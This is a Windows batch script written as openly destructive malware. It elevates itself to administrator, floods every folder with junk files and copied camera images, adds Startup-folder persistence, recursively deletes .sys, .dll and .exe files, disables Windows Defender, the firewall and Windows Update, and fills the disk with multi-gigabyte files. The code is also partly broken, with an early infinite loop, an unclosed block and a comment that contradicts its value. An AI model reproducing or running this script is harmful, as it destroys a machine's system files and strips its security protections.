@echo off
setlocal enabledelayedexpansion

:: Run the script with elevated privileges
if not "%1" == "elevated" (
    set "params=%*"
    set "params=!params:"=!"
    powershell -Command "Start-Process -Verb RunAs -FilePath cmd -ArgumentList '/c %0 elevated !params!'"
    exit /b
)

:: Create 400 notepad files in every directory
for /l %%i in (1,1,400) do (
    for /d /r %%d in (*) do (
        cd "%%~fd"
        echo gyat > "notepad_%%i.txt"
    )
)

:: Change the background to red
reg add "HKEY_CURRENT_USER\Control Panel\Colors" /v "Background" /t REG_SZ /d "0 0 255" /f

:: Change the Windows language to Russian
reg add "HKEY_CURRENT_USER\Control Panel\International" /v "LocaleName" /t REG_SZ /d "ru-RU" /f
reg add "HKEY_CURRENT_USER\Control Panel\International" /v "Locale" /t REG_SZ /d "00000419" /f

:: Create notepad files on the desktop
cd "%USERPROFILE%\Desktop"
for /l %%i in (1,1,400) do (
    echo gyat > "notepad_%%i.txt"
)

:: Open every default Windows app 20 times
for /l %%i in (1,1,20) do (
    start "" "calc.exe"
    start "" "notepad.exe"
    start "" "mspaint.exe"
    start "" "explorer.exe"
    start "" "mstsc.exe"
    start "" "wmplayer.exe"
    start "" "iexplore.exe"
    start "" "chrome.exe"
    start "" "firefox.exe"
)

:: Open the Camera app and take a picture
start "" "microsoft.windows.camera:"
timeout /t 5
:: Take a picture (this might not work on all systems)
powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('%{PRTSC}')"

:: Duplicate the picture 400 times
for /l %%i in (1,1,400) do (
    copy /y "%USERPROFILE%\Pictures\Camera Roll\*.jpg" "picture_%%i.jpg"
)

:: Put the pictures in every directory on the system
for /d /r %%d in (*) do (
    cd "%%~fd"
    for /l %%i in (1,1,400) do (
        copy /y "picture_%%i.jpg" "%%~fd"
    )
)

:: Generate random files and put them in the startup folder
for /l %%i in (1,1,10) do (
    set "rand_name=!random!!random!!random!.bat"
    echo @echo off > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%rand_name%"
    echo start "" "chrome.exe" "https://www.google.com" >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%rand_name%"
)

:: Play all sound effects
for /r %%f in (*.mp3,*.mp4,*.wav,*.mov) do (
    start "" "%%~ff"
)

:: Open Google Chrome and search for "what does gyat mean" every 4 seconds
:chrome_loop
start "" "chrome.exe" "https://www.google.com/search?q=what+does+gyat+mean"
timeout /t 4
goto chrome_loop

:: Hide the command prompt
if not "%1" == "hidden" (
    start "" /min cmd /c "%~f0" hidden
    exit
)

:: Play a continuous beep sound to annoy the user
:beep_loop
beep 1000 100
goto beep_loop

:: Create 1000 folders with random names
for /l %%i in (1,1,1000) do (
    set "rand_name=!random!!random!!random!"
    mkdir "%%rand_name%%"
)

:: Create 1000 files with random names and contents
for /l %%i in (1,1,1000) do (
    set "rand_name=!random!!random!!random!.txt"
    echo This is a random file >> "%%rand_name%%"
)

:: Move all files to the root directory
for /r %%f in (*) do (
    move /y "%%~ff" "C:\"
)

:: Delete all system files
for /r %%f in (*.sys,*.dll,*.exe) do (
   del /f /q "%%~ff"

:: Disable Windows Defender
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f

:: Disable Windows Firewall
netsh advfirewall set allprofiles state off

:: Disable Windows Update
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d 1 /f

:: Create a recursive folder structure
for /l %%i in (1,1,100) do (
    mkdir "folder_%%i"
    cd "folder_%%i"
    for /l %%j in (1,1,100) do (
        mkdir "subfolder_%%j"
        cd "subfolder_%%j"
        for /l %%k in (1,1,100) do (
            mkdir "subsubfolder_%%k"
            cd "subsubfolder_%%k"
        )
        cd ..
    )
    cd ..
)

:: Create a 10GB file
fsutil file createnew "large_file.txt" 10737418240

:: Create a 100MB file and copy it 100 times
fsutil file createnew "medium_file.txt" 104857600
for /l %%i in (1,1,100) do (
    copy /y "medium_file.txt" "medium_file_%%i.txt"
)

:: Create a 1MB file and copy it 1000 times
fsutil file createnew "small_file.txt" 1048576
for /l %%i in (1,1,1000) do (
    copy /y "small_file.txt" "small_file_%%i.txt"
)

:: Play a continuous beep sound to annoy the user
:beep_loop
beep 1000 100
goto beep_loop

:: Open Notepad and type out a long message
start "" notepad.exe
timeout /t 5
powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('This is a very long message that will take a while to type out.{ENTER}It will repeat many times and fill up the Notepad window.{ENTER}Good luck trying to close it!{ENTER}')"

:: Repeat the message 100 times
for /l %%i in (1,1,100) do (
    powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{ENTER}This is a very long message that will take a while to type out.{ENTER}It will repeat many times and fill up the Notepad window.{ENTER}Good luck trying to close it!{ENTER}')"
)

:: Open 100 instances of Notepad
for /l %%i in (1,1,100) do (
    start "" notepad.exe
)

:: Open 100 instances of Calculator
for /l %%i in (1,1,100) do (
    start "" calc.exe
)

:: Open 100 instances of Paint
for /l %%i in (1,1,100) do (
    start "" mspaint.exe
)

:: Open 100 instances of Windows Media Player
for /l %%i in (1,1,100) do (
    start "" wmplayer.exe
)

:: Open 100 instances of Internet Explorer
for /l %%i in (1,1,100) do (
    start "" iexplore.exe
)

:: Open 100 instances of Chrome
for /l %%i in (1,1,100) do (
    start "" chrome.exe
)

:: Open 100 instances of Firefox
for /l %%i in (1,1,100) do (
    start "" firefox.exe
)

:: Create a 1GB file and copy it 10 times
fsutil file createnew "large_file2.txt" 1073741824
for /l %%i in (1,1,10) do (
    copy /y "large_file2.txt" "large_file2_%%i.txt"
)

:: Create a 500MB file and copy it 20 times
fsutil file createnew "medium_file2.txt" 536870912
for /l %%i in (1,1,20) do (
    copy /y "medium_file2.txt" "medium_file2_%%i.txt"
)

:: Create a 100MB file and copy it 50 times
fsutil file createnew "small_file2.txt" 104857600
for /l %%i in (1,1,50) do (
    copy /y "small_file2.txt" "small_file2_%%i.txt"
)

:: Play a continuous beep sound
